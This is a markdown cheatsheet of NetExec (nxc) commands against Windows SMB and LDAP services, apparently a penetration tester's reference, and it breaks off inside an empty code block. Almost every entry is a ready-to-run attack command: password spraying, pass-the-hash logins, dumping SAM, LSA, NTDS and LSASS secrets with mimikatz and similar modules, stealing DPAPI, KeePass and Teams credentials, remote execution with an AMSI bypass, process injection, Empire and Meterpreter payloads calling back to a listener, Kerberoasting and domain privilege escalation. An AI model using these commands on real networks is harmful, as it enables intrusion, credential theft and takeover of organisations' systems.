# NetExec (nxc) Cheatsheet

## SMB Protocol

### Authentication

## nxc - domain authentication with password
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -p '<password>'
```

## nxc - domain authentication with NTLM hash (full)
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -H 'LM:NT'
```

## nxc - domain authentication with NTLM hash (NT only)
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -H '<NTHASH>'
```

## nxc - local authentication with password
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth
```

## nxc - null session authentication
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u '' -p ''
```

## nxc - local authentication with NTLM hash
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
```bash
nxc smb <ip> -u <user> -H '<hash>' --local-auth
```

## nxc - resource-based constrained delegation
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' --delegate <target_user>
```

## nxc - self-delegation with computer account
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXPLOIT
```bash
nxc smb <ip> -u '<computer_account>' -H <hash> --delegate <target_user> --self
```

### Password Spraying

## nxc - password spray multiple users
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u user1 user2 user3 -p <password>
```

## nxc - password spray multiple passwords
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <user> -p password1 password2 password3
```

## nxc - password spray with user file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p <password>
```

## nxc - password spray with password file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <user> -p <passwordfile>
```

## nxc - password spray continue on success
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p <password> --continue-on-success
```

## nxc - check username equals password
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p <userfile> --no-bruteforce --continue-on-success
```

## nxc - password spray without bruteforce
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
```bash
nxc smb <ip> -u <userfile> -p <passwordfile> --no-bruteforce --continue-on-success
```

### Enumeration

## nxc - enumerate network hosts
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip>
```

## nxc - enumerate shares with null session
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u '' -p '' --shares
```

## nxc - enumerate users with null session
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u '' -p '' --users
```

## nxc - enumerate groups with null session
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u '' -p '' --groups
```

## nxc - enumerate password policy with null session
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u '' -p '' --pass-pol
```

## nxc - enumerate shares and permissions
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares
```

## nxc - enumerate readable shares only
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares READ
```

## nxc - enumerate writable shares only
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares WRITE
```

## nxc - enumerate read and write shares
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --shares READ,WRITE
```

## nxc - enumerate domain users
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --users
```

## nxc - export domain users to file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --users-export <output_file>
```

## nxc - enumerate users by RID bruteforce
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --rid-brute
```

## nxc - enumerate local groups
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --local-group
```

## nxc - enumerate logged-on users via WksSvc
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --loggedon-users
```

## nxc - enumerate specific logged-on user
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --loggedon-users <target_user>
```

## nxc - enumerate logged-on users via registry
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --reg-sessions
```

## nxc - enumerate specific user session via registry
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --reg-sessions <target_user>
```

## nxc - enumerate sessions from user file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --reg-sessions <userfile>
```

## nxc - enumerate active Windows sessions
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --qwinsta
```

## nxc - enumerate specific active session
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --qwinsta <username>
```

## nxc - enumerate disks
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --disks
```

## nxc - enumerate network interfaces
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --interfaces
```

## nxc - enumerate password policy
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --pass-pol
```

## nxc - enumerate antivirus and EDR
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M enum_av
```

## nxc - enumerate BitLocker status
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M bitlocker
```

## nxc - enumerate lockscreen backdoors
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M lockscreendoors
```

## nxc - enumerate running processes
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --tasklist
```

## nxc - enumerate specific process
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --tasklist <process_name>
```

## nxc - kill process by PID
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' --taskkill <PID>
```

## nxc - kill process by name
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' --taskkill <process_name>
```

## nxc - generate SMB relay list
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> --gen-relay-list <output_file>
```

### Command Execution

## nxc - execute Windows command
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -x <command>
```

## nxc - execute PowerShell command
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -X <powershell_command>
```

## nxc - execute PowerShell with AMSI bypass
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -X <command> --amsi-bypass <payload_path>
```

## nxc - process injection module
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M pi -o PID=<pid> EXEC=<command>
```

### Credential Dumping

## nxc - dump SAM hashes
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sam
```

## nxc - dump SAM with secdump method
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sam secdump
```

## nxc - dump LSA secrets
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --lsa
```

## nxc - dump LSA with secdump method
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --lsa secdump
```

## nxc - dump NTDS.dit
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds
```

## nxc - dump NTDS.dit enabled accounts only
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds --enabled
```

## nxc - dump NTDS.dit using VSS method
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds vss
```

## nxc - dump specific user from NTDS.dit
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --ntds --user <target_user>
```

## nxc - dump NTDS.dit using ntdsutil module
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M ntdsutil
```

## nxc - dump LSASS using lsassy
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M lsassy
```

## nxc - dump LSASS using nanodump
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M nanodump
```

## nxc - dump LSASS using mimikatz
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M mimikatz
```

## nxc - mimikatz with custom command
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M mimikatz -o COMMAND='<mimikatz_command>'
```

## nxc - dump DPAPI credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi
```

## nxc - dump DPAPI cookies only
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi cookies
```

## nxc - dump DPAPI without system credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi nosystem
```

## nxc - dump DPAPI with local auth
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth --dpapi nosystem
```

## nxc - discover KeePass databases
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M keepass_discover
```

## nxc - dump KeePass credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M keepass_trigger -o KEEPASS_CONFIG_PATH=<path>
```

## nxc - dump WinSCP credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M winscp
```

## nxc - dump PuTTY credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M putty
```

## nxc - dump VNC credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M vnc
```

## nxc - dump mRemoteNG credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M mremoteng
```

## nxc - dump RDCMan credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M rdcman
```

## nxc - dump Notepad++ saved files
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M notepad++
```

## nxc - dump Notepad unsaved buffers
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M notepad
```

## nxc - dump WiFi passwords
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wifi
```

## nxc - dump Veeam credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M veeam
```

## nxc - dump SCCM credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sccm
```

## nxc - dump SCCM from disk
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sccm disk
```

## nxc - dump SCCM from WMI
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --sccm wmi
```

## nxc - dump Token Broker Cache
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wam
```

## nxc - dump Token Broker with masterkeys file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wam --mkfile <masterkeys_file>
```

## nxc - dump Token Broker with backup key
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M wam --pvk <backup_key_file>
```

## nxc - dump eventlog credentials
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M eventlog_creds
```

## nxc - dump credentials using Backup Operator privileges
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M backup_operator
```

## nxc - dump user security questions
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M security-questions
```

### File Operations

## nxc - upload file to target
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/FILE
```bash
nxc smb <ip> -u <user> -p '<password>' --put-file <local_file> <remote_file>
```

## nxc - download file from target
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/FILE
```bash
nxc smb <ip> -u <user> -p '<password>' --get-file <remote_file> <local_file>
```

### Share Spidering

## nxc - spider share with pattern
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --spider <share> --pattern <pattern>
```

## nxc - spider all shares
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M spider_plus
```

## nxc - spider and download all files
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=True
```

### Vulnerability Scanning

## nxc - check for ZeroLogon
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M zerologon
```

## nxc - check for noPAC
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M nopac
```

## nxc - check for PrintNightmare
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M printnightmare
```

## nxc - check for SMBGhost
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M smbghost
```

## nxc - check for MS17-010
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M ms17-010
```

## nxc - check for NTLM reflection
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u <user> -p '<password>' -M ntlm_reflection
```

## nxc - check for coerce vulnerabilities
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus
```

## nxc - coerce with listener IP
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<listener_ip>
```

## nxc - coerce with all methods
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<listener_ip> ALWAYS=true
```

## nxc - check specific coerce method
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=<method_name>
```

## nxc - check if Spooler service is running
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M spooler
```

## nxc - check if WebDAV is running
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M webdav
```

### LAPS

## nxc - read LAPS password
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --laps
```

## nxc - read LAPS with custom admin name
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --laps <admin_name>
```

### User Impersonation

## nxc - impersonate user with scheduled task
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M schtask_as -o USER=<target_user> CMD=<command>
```

## nxc - impersonate user with custom task parameters
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth -M schtask_as -o USER=<target> CMD=<command> TASK=<task_name> FILE=<output_file> LOCATION=<path>
```

### Password Management

## nxc - change own password
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o NEWPASS=<new_password>
```

## nxc - change own password with hash
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o NEWNTHASH=<new_hash>
```

## nxc - change target user password
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o USER=<target_user> NEWPASS=<new_password>
```

## nxc - change target user password with hash
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/PRIVESC
```bash
nxc smb <ip> -u <user> -p '<password>' -M change-password -o USER=<target_user> NEWHASH=<new_hash>
```

### Microsoft Teams

## nxc - steal Teams cookies
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' -M teams_localdb
```

### Kerberos

## nxc - generate hosts file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> --generate-hosts-file <filename>
```

## nxc - generate krb5.conf file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
```bash
netexec smb <ip> -u <user> -p '<password>' --generate-krb5-file <path>
```

## nxc - generate TGT
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
```bash
netexec smb <ip> -u <user> -p '<password>' --generate-tgt <path>
```

## nxc - use Kerberos cache file
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
```bash
netexec smb <ip> -u <user> -k --use-kcache
```

### Getting Shells

## nxc - deploy Empire agent
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M empire_exec -o LISTENER=<listener_name>
```

## nxc - inject Meterpreter payload
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/EXECUTION
```bash
nxc smb <ip> -u <user> -p '<password>' -M met_inject -o SRVHOST=<ip> SRVPORT=<port> RAND=<random_string> SSL=<http|https>
```

### SCCM Enumeration

## nxc - enumerate SCCM infrastructure
#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -M sccm-recon6
```

---

## LDAP Protocol

### Authentication

## nxc - LDAP test credentials
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/AUTH
```bash
nxc ldap <ip> -u <user> -p '<password>'
```

## nxc - LDAP authentication with hash
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/AUTH
```bash
nxc ldap <ip> -u <user> -H <hash>
```

## nxc - LDAP test account existence without Kerberos
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/AUTH
```bash
nxc ldap <ip> -u <userfile> -p '' -k
```

### User Enumeration

## nxc - enumerate all LDAP users
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --users
```

## nxc - export LDAP users to file
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --users-export <output_file>
```

## nxc - enumerate active users only
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --active-users
```

## nxc - get user descriptions
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-desc-users
```

### Group Enumeration

## nxc - enumerate all LDAP groups
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --groups
```

## nxc - enumerate specific group members
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --groups "<group_name>"
```

### Kerberos Attacks

## nxc - Kerberoast users
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --kerberoasting <output_file>
```

## nxc - Kerberoast via ASREPRoast
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '' --no-preauth-targets <userfile> --kerberoasting <output_file>
```

## nxc - ASREPRoast without authentication
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '' --asreproast <output_file>
```

## nxc - ASREPRoast with user list
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <userfile> -p '' --asreproast <output_file>
```

## nxc - ASREPRoast with authentication
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
```

## nxc - ASREPRoast with kdcHost
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <domain>
```

### Domain Information

## nxc - get domain SID
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -k --get-sid
```

## nxc - list domain controllers
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --dc-list
```

## nxc - extract network subnets
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-network
```

## nxc - extract subnets hosts only
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-network -o ONLY_HOSTS=true
```

## nxc - extract all subnet information
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-network -o ALL=true
```

## nxc - get machine account quota
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M maq
```

## nxc - enumerate admin count users
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --admin-count
```

## nxc - query admin count with LDAP filter
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --query "(adminCount=1)" "sAMAccountName"
```

## nxc - check LDAP signing
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M ldap-checker
```

### Delegation Issues

## nxc - find unconstrained delegation
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

## nxc - find misconfigured delegation
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --find-delegation
```

### gMSA

## nxc - dump gMSA passwords
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --gmsa
```

## nxc - extract gMSA secrets by ID
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --gmsa-convert-id <gmsa_id>
```

### LDAP Queries

## nxc - custom LDAP query all attributes
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --query "<ldap_filter>" ""
```

## nxc - custom LDAP query specific attributes
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --query "<ldap_filter>" "<attributes>"
```

### BloodHound

## nxc - run BloodHound collector all methods
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection All
```

## nxc - run BloodHound with specific methods
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection <methods>
```

### ADCS Exploitation

## nxc - enumerate ADCS
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M adcs
```

## nxc - enumerate ADCS with server
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M adcs -o SERVER=<server_name>
```

### DACL Rights

## nxc - read DACL rights for target
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<target> ACTION=read
```

## nxc - read DACL rights with principal
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<target> ACTION=read PRINCIPAL=<principal>
```

## nxc - read DACL for specific rights
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET_DN=<dn> ACTION=read RIGHTS=<rights>
```

## nxc - read denied DACL entries
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<target> ACTION=read ACE_TYPE=denied
```

## nxc - backup DACL from file
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<targets_file> ACTION=backup
```

### Privilege Escalation

## nxc - RaiseChild attack
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> -u <user> -p '<password>' -M raisechild
```

## nxc - RaiseChild with custom user
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
